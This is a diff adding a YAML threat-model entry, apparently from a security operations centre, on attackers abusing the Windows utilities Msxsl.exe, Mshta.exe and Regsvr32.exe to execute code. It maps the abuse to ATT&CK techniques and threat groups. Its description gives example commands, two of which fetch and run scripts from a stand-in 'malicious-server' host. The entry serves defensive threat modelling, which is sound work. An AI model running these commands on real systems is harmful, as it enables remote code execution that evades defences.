@@ -1,0 +1,74 @@
+name: Malicious Code Execution with Windows Utilities
+criticality: Medium
+metadata:
+  uuid: d5892ae6-d022-4ac8-858c-c2756067cdac
+  schema: threat::1.0
+  version: 1
+  created: 2024-11-04
+  modified: 2024-11-04
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+threat:
+  actors:
+    - att&ck::G0046
+    - misp::00220228-a5a4-4032-a30d-826bb55aa3fb
+    - att&ck::G0080
+    - misp::01967480-c49b-4d4a-a7fa-aef0eaf535fe
+    - att&ck::G0007
+    - misp::5b4ee3ea-eee3-4c8e-8323-85ae32658754
+  killchain: Execution
+  att&ck:
+    - T1218.005
+    - T1218.010
+  chaining:
+    - relation: atomicity::implements
+      vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745
+      description: |-
+        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
+  terrain: |-
+    Threat Actor must have the ability to execute code on a Windows system where the 
+    specified utilities Msxsl.exe, Mshta.exe, and Regsvr32.exe are present. 
+    This often requires initial access through phishing, exploitation of vulnerabilities, 
+    or use of valid credentials.
+
+    Domains: Enterprise
+    Targets: Virtual Machines, Workstations, Laptop
+    Platforms: Windows, Active Directory, PowerShell
+  severity: Significant incident
+  leverage: Elevation of privilege; Tampering; Spoofing
+  impact: Data Breach; Business disruption; Reputational Damages; Legal and regulatory
+  viability: Likely
+  description: |-
+    ### 1. Msxsl.exe
+
+    **Description**: A command-line XSLT processor that can transform XML data using 
+    XSL style sheets. Attackers can craft malicious XSL files that execute arbitrary 
+    code when processed.
+
+    Example:
+
+    ```
+    msxsl.exe input.xml malicious.xsl
+    ```
+
+    ### 2. Mshta.exe
+    **Description**: Executes Microsoft HTML Applications (HTA files). Threat actors use it 
+    to run malicious scripts hosted locally or remotely.
+
+    Example:
+
+    ```
+    mshta.exe "http://malicious-server/payload.hta"
+    ```
+
+    ### 3. Regsvr32.exe
+    **Description**: Registers and unregisters OLE controls like DLLs and ActiveX controls. 
+    Threat actors can use it to execute code via scripts.
+
+    Example:
+
+    ```
+    regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
+    ```
